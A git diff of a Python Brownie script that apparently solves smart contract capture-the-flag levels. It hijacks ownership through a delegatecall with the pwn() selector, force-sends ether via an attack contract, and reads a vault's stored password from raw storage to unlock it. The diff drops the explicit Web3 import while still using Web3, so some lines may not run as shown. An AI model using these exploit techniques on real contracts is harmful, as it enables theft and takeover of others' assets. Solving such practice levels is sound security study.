@@ -1,9 +1,13 @@
-from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, network, config, accounts, Contract
+from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
+from brownie import AttackForce, Vault
 from brownie.network.gas.strategies import GasNowStrategy
 from brownie.network import gas_price
 from scripts.helpful_scripts import *
-from web3 import Web3
 import time
+from web3.auto.infura import w3
+import os
+
+
 
 
 
@@ -114,7 +118,39 @@ def attack_token(_token, _account, _deployerAccount):
     _token.transfer(_deployerAccount, 21, {"from":_account})
     print(f"After the attack...our balance is {_token.balanceOf(_account.address)}")
 
+def deploy_delegation():
+    account = get_account()
+
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        delegate = deploy_contract(Delegate, "Delegate", 1, [accounts[1].address])
+        
+    delegation = deploy_contract(Delegation, "Delegation", 1, [])
     
+    data_to_send = Web3.keccak(text="pwn()")[0:4].hex()
+    print(f"Before the attack...are we owner of delegation? {delegation.owner() == account.address}")
+    account.transfer(delegation.address,amount="0 ether", data=data_to_send).wait(1)
+    print(f"After the attack...are we owner of delegation? {delegation.owner() == account.address}")
+
+def deploy_force():
+    account = get_account()
+    force = deploy_contract(Force, "Force", 1, [])
+    attackForce = AttackForce.deploy({"from": account}, publish_source=False)
+    attackForce.attack(force.address, {"from":account, "value":1})
+    print("Force attacked! Try submitting the solution as complete.")
+
+    
+def deploy_vault():
+    account = get_account()
+    vault = deploy_contract(Vault, "Vault", 1, [bytes("testpassword", encoding='utf8')])
+    w3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
+    
+    print(f"Connected? {w3.isConnected()}")
+    password = w3.eth.get_storage_at(vault.address, 1) # get 2nd variable
+    passwordDecode = password.decode("utf-8")
+    print(f"Password found: {passwordDecode}")
+    vault.unlock(password, {"from":account}).wait(1)
+    print(f"Locked? {vault.locked()}")
+    print("Vault attacked! Try submitting the solution as complete.")
 
 
 
@@ -124,4 +160,7 @@ def main():
     #deploy_fallout()
     #deploy_coinFlip()
     #deploy_telephone()
-    deploy_token()
+    #deploy_token()
+    #deploy_delegation()
+    #deploy_force()
+    deploy_vault()
